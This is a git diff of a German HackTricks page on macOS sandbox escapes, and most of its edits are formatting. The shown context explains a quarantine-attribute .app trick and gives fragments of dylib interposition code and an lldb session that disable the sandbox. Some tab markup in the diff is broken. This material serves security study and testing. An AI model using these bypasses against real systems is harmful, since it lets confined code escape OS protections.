@@ -9,7 +9,7 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
@@ -31,7 +31,7 @@ Schließlich wird die Sandbox mit einem Aufruf von **`__sandbox_ms`** aktiviert,
 
 **Von sandboxed Prozessen erstellte Dateien** erhalten das **Quarantäne-Attribut**, um eine Umgehung der Sandbox zu verhindern. Wenn es Ihnen jedoch gelingt, einen **`.app`-Ordner ohne das Quarantäne-Attribut** in einer sandboxed Anwendung zu erstellen, könnten Sie die App-Bundle-Binärdatei auf **`/bin/bash`** zeigen lassen und einige Umgebungsvariablen in der **plist** hinzufügen, um **`open`** zu missbrauchen und die neue App unsandboxed zu starten.
 
-Dies wurde in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)** so gemacht.**
+Dies wurde in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)\*\* so gemacht.\*\*
 
 {% hint style="danger" %}
 Daher können Sie im Moment, wenn Sie nur in der Lage sind, einen Ordner mit einem Namen, der mit **`.app`** endet, ohne ein Quarantäne-Attribut zu erstellen, die Sandbox umgehen, da macOS nur das Quarantäne-Attribut im **`.app`-Ordner** und in der **Hauptausführbaren Datei** überprüft (und wir werden die Hauptausführbare Datei auf **`/bin/bash`** zeigen).
@@ -77,18 +77,21 @@ Wenn Sie aus dem Sandbox-Prozess heraus in der Lage sind, andere Prozesse zu **k
 [**Diese Forschung**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) hat 2 Möglichkeiten entdeckt, die Sandbox zu umgehen. Da die Sandbox von Userland angewendet wird, wenn die **libSystem**-Bibliothek geladen wird. Wenn eine Binärdatei das Laden vermeiden könnte, würde sie niemals in die Sandbox gelangen:
 
 * Wenn die Binärdatei **vollständig statisch kompiliert** wäre, könnte sie das Laden dieser Bibliothek vermeiden.
-* Wenn die Binärdatei keine Bibliotheken laden müsste (weil der Linker auch in libSystem ist), müsste sie libSystem nicht laden.&#x20;
+* Wenn die Binärdatei keine Bibliotheken laden müsste (weil der Linker auch in libSystem ist), müsste sie libSystem nicht laden.
 
 ### Shellcodes
 
 Beachten Sie, dass **selbst Shellcodes** in ARM64 in `libSystem.dylib` verknüpft werden müssen:
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### Berechtigungen
 
 Beachten Sie, dass selbst wenn einige **Aktionen** durch die **Sandbox erlaubt** sein könnten, wenn eine Anwendung über eine bestimmte **Berechtigung** verfügt, wie zum Beispiel:
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ Beachten Sie, dass selbst wenn einige **Aktionen** durch die **Sandbox erlaubt**
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### Interposting-Bypass
 
 Für weitere Informationen über **Interposting** siehe:
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### Interposten von `_libsecinit_initializer`, um die Sandbox zu verhindern
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### Interpost `__mac_syscall` um die Sandbox zu umgehen
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,18 +183,21 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Debuggen und Umgehen der Sandbox mit lldb
 
 Lassen Sie uns eine Anwendung kompilieren, die in einer Sandbox ausgeführt werden soll:
 
 {% tabs %}
-{% tab title="sand.c" %}
+{% tab title="undefined" %}
 ```c
 #include <stdlib.h>
 int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
+{% endtab %}
+
 {% tab title="entitlements.xml" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -197,22 +207,20 @@ system("cat ~/Desktop/del.txt");
 </dict>
 </plist>
 ```
-{% tab title="Info.plist" %}
 
 Der Info.plist ist eine Datei, die in macOS-Sandbox-Anwendungen verwendet wird, um Informationen über die Anwendung und ihre Berechtigungen bereitzustellen. Es ist eine XML-Datei, die in der Regel im Hauptverzeichnis der Anwendung gefunden wird. Der Inhalt der Info.plist-Datei definiert die Sandbox-Berechtigungen und -Einschränkungen für die Anwendung.
 
 Die Info.plist-Datei enthält verschiedene Schlüssel und Werte, die spezifische Informationen über die Anwendung angeben. Einige der wichtigen Schlüssel in der Info.plist-Datei sind:
 
-- `CFBundleIdentifier`: Dieser Schlüssel gibt die eindeutige Kennung der Anwendung an.
-- `NSAppTransportSecurity`: Dieser Schlüssel definiert die Sicherheitseinstellungen für den Netzwerkzugriff der Anwendung.
-- `NSCameraUsageDescription`: Dieser Schlüssel gibt eine Beschreibung für die Verwendung der Kamera durch die Anwendung an.
-- `NSMicrophoneUsageDescription`: Dieser Schlüssel gibt eine Beschreibung für die Verwendung des Mikrofons durch die Anwendung an.
+* `CFBundleIdentifier`: Dieser Schlüssel gibt die eindeutige Kennung der Anwendung an.
+* `NSAppTransportSecurity`: Dieser Schlüssel definiert die Sicherheitseinstellungen für den Netzwerkzugriff der Anwendung.
+* `NSCameraUsageDescription`: Dieser Schlüssel gibt eine Beschreibung für die Verwendung der Kamera durch die Anwendung an.
+* `NSMicrophoneUsageDescription`: Dieser Schlüssel gibt eine Beschreibung für die Verwendung des Mikrofons durch die Anwendung an.
 
 Die Info.plist-Datei kann bearbeitet werden, um die Sandbox-Berechtigungen zu ändern oder zu umgehen. Durch das Hinzufügen oder Ändern bestimmter Schlüssel und Werte können Anwendungen möglicherweise auf Ressourcen oder Funktionen zugreifen, für die sie normalerweise keine Berechtigung haben.
 
 Es ist jedoch wichtig zu beachten, dass das Ändern der Info.plist-Datei einer Anwendung potenzielle Sicherheitsrisiken mit sich bringen kann und möglicherweise gegen die Richtlinien und Best Practices von Apple verstößt. Es sollte nur zu Test- oder Debugging-Zwecken verwendet werden und nicht für böswillige Zwecke.
 
-{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
@@ -243,12 +251,14 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% hint style="danger" %}
 Die App wird versuchen, die Datei **`~/Desktop/del.txt`** zu **lesen**, was die **Sandbox nicht erlaubt**.\
 Erstellen Sie eine Datei dort, da sie nach dem Umgehen der Sandbox gelesen werden kann:
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 Lassen Sie uns die Anwendung debuggen, um zu sehen, wann die Sandbox geladen wird:
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -325,6 +335,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **Auch wenn die Sandbox umgangen wird, wird TCC** den Benutzer fragen, ob er dem Prozess erlauben möchte, Dateien vom Desktop zu lesen.
 {% endhint %}
@@ -344,7 +355,7 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
